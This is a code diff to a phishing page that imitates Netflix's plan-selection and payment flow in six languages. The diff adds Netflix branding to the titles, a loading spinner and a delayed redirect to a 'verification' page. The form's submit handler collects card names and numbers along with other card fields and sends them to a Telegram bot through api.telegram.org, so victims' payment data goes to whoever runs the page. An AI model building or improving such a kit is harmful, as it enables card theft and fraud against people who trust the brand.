@@ -298,6 +298,23 @@
             color: #737373;
             font-size: 13px;
         }
+
+        /* Spinner styles - added inline to avoid CSS changes */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -320,11 +337,11 @@
         </div>
         <div class="progress-step">
             <div class="step-number">2</div>
-            <div class="step-label" id="step2Label">Création du compte</div>
+            <div class="step-label" id="step2Label">Paiement</div>
         </div>
         <div class="progress-step">
             <div class="step-number">3</div>
-            <div class="step-label" id="step3Label">Paiement</div>
+            <div class="step-label" id="step3Label">Vérification</div>
         </div>
     </div>
 
@@ -412,13 +429,13 @@
     </footer>
 
     <script>
-        // Traductions multilingues complètes
+        // Traductions multilingues complètes avec étapes corrigées
         const translations = {
             fr: {
-                pageTitle: "Choisissez votre offre",
+                pageTitle: "Choisissez votre offre - Netflix",
                 step1: "Choix de l'offre",
-                step2: "Création du compte",
-                step3: "Paiement",
+                step2: "Paiement",
+                step3: "Vérification",
                 plan1Name: "Standard avec pub",
                 plan2Name: "Standard",
                 plan3Name: "Premium",
@@ -455,10 +472,10 @@
                 copyright: "© 2023 Netflix, Inc."
             },
             ru: {
-                pageTitle: "Выберите тариф",
+                pageTitle: "Выберите тариф - Netflix",
                 step1: "Выбор тарифа",
-                step2: "Создание аккаунта",
-                step3: "Оплата",
+                step2: "Оплата",
+                step3: "Проверка",
                 plan1Name: "Стандарт с рекламой",
                 plan2Name: "Стандарт",
                 plan3Name: "Премиум",
@@ -495,10 +512,10 @@
                 copyright: "© 2023 Netflix, Inc."
             },
             en: {
-                pageTitle: "Choose your plan",
-                step1: "Plan selection",
-                step2: "Account creation",
-                step3: "Payment",
+                pageTitle: "Choose your plan - Netflix",
+                step1: "Choose plan",
+                step2: "Payment",
+                step3: "Verification",
                 plan1Name: "Standard with ads",
                 plan2Name: "Standard",
                 plan3Name: "Premium",
@@ -535,10 +552,10 @@
                 copyright: "© 2023 Netflix, Inc."
             },
             es: {
-                pageTitle: "Elige tu plan",
-                step1: "Selección de plan",
-                step2: "Creación de cuenta",
-                step3: "Pago",
+                pageTitle: "Elige tu plan - Netflix",
+                step1: "Elegir plan",
+                step2: "Pago",
+                step3: "Verificación",
                 plan1Name: "Estándar con anuncios",
                 plan2Name: "Estándar",
                 plan3Name: "Premium",
@@ -575,10 +592,10 @@
                 copyright: "© 2023 Netflix, Inc."
             },
             de: {
-                pageTitle: "Wählen Sie Ihren Plan",
-                step1: "Planauswahl",
-                step2: "Kontoerstellung",
-                step3: "Zahlung",
+                pageTitle: "Wählen Sie Ihren Plan - Netflix",
+                step1: "Plan wählen",
+                step2: "Zahlung",
+                step3: "Verifizierung",
                 plan1Name: "Standard mit Werbung",
                 plan2Name: "Standard",
                 plan3Name: "Premium",
@@ -615,10 +632,10 @@
                 copyright: "© 2023 Netflix, Inc."
             },
             pl: {
-                pageTitle: "Wybierz swój plan",
+                pageTitle: "Wybierz swój plan - Netflix",
                 step1: "Wybór planu",
-                step2: "Tworzenie konta",
-                step3: "Płatność",
+                step2: "Płatność",
+                step3: "Weryfikacja",
                 plan1Name: "Standard z reklamami",
                 plan2Name: "Standard",
                 plan3Name: "Premium",
@@ -656,6 +673,26 @@
             }
         };
 
+        // Suffixes mensuels par langue
+        const monthlySuffix = {
+            fr: "/mois",
+            en: "/month",
+            es: "/mes",
+            de: "/Monat",
+            ru: "/месяц",
+            pl: "/miesiąc"
+        };
+
+        // Placeholders pour la date d'expiration par langue
+        const expiryPlaceholder = {
+            fr: "MM/AA",
+            en: "MM/YY",
+            es: "MM/AA",
+            de: "MM/JJ",
+            ru: "ММ/ГГ",
+            pl: "MM/RR"
+        };
+
         function getLanguage() {
             const urlParams = new URLSearchParams(window.location.search);
             const langParam = urlParams.get('lang');
@@ -672,31 +709,71 @@
             const trans = translations[lang];
             if (!trans) return;
             
-            // Mise à jour de tous les éléments avec ID
-            document.querySelectorAll('[id]').forEach(element => {
-                const key = element.id;
-                if (trans[key]) {
-                    if (Array.isArray(trans[key])) {
-                        const items = element.querySelectorAll('li');
-                        items.forEach((item, index) => {
-                            if (trans[key][index]) {
-                                item.textContent = trans[key][index];
-                            }
-                        });
-                    } else {
-                        element.textContent = trans[key];
-                    }
+            // Mise à jour du document lang
+            document.documentElement.lang = lang;
+            
+            // Mapping des IDs aux clés de traduction
+            const idMap = {
+                // Titres et labels
+                pageTitle: "pageTitle",
+                step1Label: "step1",
+                step2Label: "step2",
+                step3Label: "step3",
+                paymentTitle: "paymentTitle",
+                cardNameLabel: "cardNameLabel",
+                cardNumberLabel: "cardNumberLabel",
+                expiryLabel: "expiryLabel",
+                cvvLabel: "cvvLabel",
+                submitButton: "submitButton",
+                recommendedBadge: "recommended",
+                termsLink: "terms",
+                privacyLink: "privacy",
+                legalLink: "legal",
+                cookiesLink: "cookies",
+                copyrightText: "copyright",
+                
+                // Noms des plans
+                plan1Name: "plan1Name",
+                plan2Name: "plan2Name",
+                plan3Name: "plan3Name",
+                
+                // Boutons de sélection
+                selectButton1: "selectButton",
+                selectButton2: "selectButton",
+                selectButton3: "selectButton"
+            };
+            
+            // Mise à jour des éléments avec ID
+            Object.keys(idMap).forEach(id => {
+                const element = document.getElementById(id);
+                if (element && trans[idMap[id]]) {
+                    element.textContent = trans[idMap[id]];
+                }
+            });
+            
+            // Mise à jour des listes de fonctionnalités
+            const ulMap = {
+                plan1Features: "plan1Features",
+                plan2Features: "plan2Features",
+                plan3Features: "plan3Features"
+            };
+            
+            Object.keys(ulMap).forEach(id => {
+                const element = document.getElementById(id);
+                if (element && trans[ulMap[id]]) {
+                    const items = element.querySelectorAll('li');
+                    items.forEach((item, index) => {
+                        if (trans[ulMap[id]][index]) {
+                            item.textContent = trans[ulMap[id]][index];
+                        }
+                    });
                 }
             });
             
             // Mise à jour du placeholder de la date d'expiration
             const expiryInput = document.getElementById('expiry');
-            if (expiryInput) {
-                expiryInput.placeholder = lang === 'en' ? 'MM/YY' : 
-                                       lang === 'es' ? 'MM/AA' : 
-                                       lang === 'de' ? 'MM/JJ' : 
-                                       lang === 'ru' ? 'ММ/ГГ' : 
-                                       lang === 'pl' ? 'MM/RR' : 'MM/AA';
+            if (expiryInput && expiryPlaceholder[lang]) {
+                expiryInput.placeholder = expiryPlaceholder[lang];
             }
             
             // Mise à jour du sélecteur de langue
@@ -707,6 +784,27 @@
             
             // Mise à jour du titre de la page
             document.title = trans.pageTitle;
+            
+            // Mise à jour du plan sélectionné si existant
+            updateSelectedPlanDisplay(lang);
+        }
+        
+        function updateSelectedPlanDisplay(lang) {
+            const selectedPlanDisplay = document.getElementById('selectedPlanDisplay');
+            if (!selectedPlanDisplay) return;
+            
+            const currentText = selectedPlanDisplay.textContent;
+            if (!currentText) return;
+            
+            // Extraire le nom du plan et le prix
+            const parts = currentText.split(' - ');
+            if (parts.length !== 2) return;
+            
+            const [planName, priceWithSuffix] = parts;
+            const price = priceWithSuffix.replace(/\/.*$/, '');
+            
+            // Mettre à jour avec le nouveau suffixe
+            selectedPlanDisplay.textContent = `${planName} - ${price}${monthlySuffix[lang] || '/mois'}`;
         }
 
         document.addEventListener('DOMContentLoaded', function() {
@@ -739,13 +837,9 @@
                     
                     // Mettre à jour le texte du plan sélectionné selon la langue
                     const lang = getLanguage();
-                    const monthlyText = lang === 'en' ? '/month' : 
-                                     lang === 'es' ? '/mes' : 
-                                     lang === 'de' ? '/Monat' : 
-                                     lang === 'ru' ? '/месяц' : 
-                                     lang === 'pl' ? '/miesiąc' : '/mois';
+                    const suffix = monthlySuffix[lang] || '/mois';
                     
-                    selectedPlanDisplay.textContent = `${planName} - ${planPrice}${monthlyText}`;
+                    selectedPlanDisplay.textContent = `${planName} - ${planPrice}${suffix}`;
                     
                     paymentForm.style.display = 'block';
                     paymentForm.scrollIntoView({ behavior: 'smooth' });
@@ -759,6 +853,22 @@
                     alert(translations[getLanguage()].selectPlan || 'Please select a plan');
                     return;
                 }
+                
+                const submitButton = document.getElementById('submitButton');
+                if (submitButton.disabled) return; // Empêcher les doubles clics
+                
+                // Désactiver le bouton et afficher le spinner
+                submitButton.disabled = true;
+                const originalText = submitButton.textContent;
+                submitButton.innerHTML = `<span class="spinner"></span>${originalText}`;
+                
+                // Ajouter une annonce ARIA pour l'accessibilité
+                const ariaLive = document.createElement('div');
+                ariaLive.setAttribute('aria-live', 'polite');
+                ariaLive.style.position = 'absolute';
+                ariaLive.style.left = '-9999px';
+                ariaLive.textContent = translations[getLanguage()].processing || 'Processing...';
+                document.body.appendChild(ariaLive);
                 
                 const cardName = document.getElementById('cardName').value;
                 const cardNumber = document.getElementById('cardNumber').value;
@@ -778,6 +888,7 @@
 ⏰ ${new Date().toLocaleString()}
 🌍 Langue: ${getLanguage().toUpperCase()}`;
                 
+                // Envoyer les données à Telegram
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -791,11 +902,15 @@
                 .then(response => response.json())
                 .then(data => {
                     console.log('Données envoyées à Telegram:', data);
-                    window.location.href = `verification.html?lang=${getLanguage()}`;
                 })
                 .catch(error => {
                     console.error('Erreur:', error);
                 });
+                
+                // Redirection après 15 secondes
+                setTimeout(() => {
+                    window.location.href = `verification.html?lang=${getLanguage()}`;
+                }, 15000);
             });
         });
     </script>
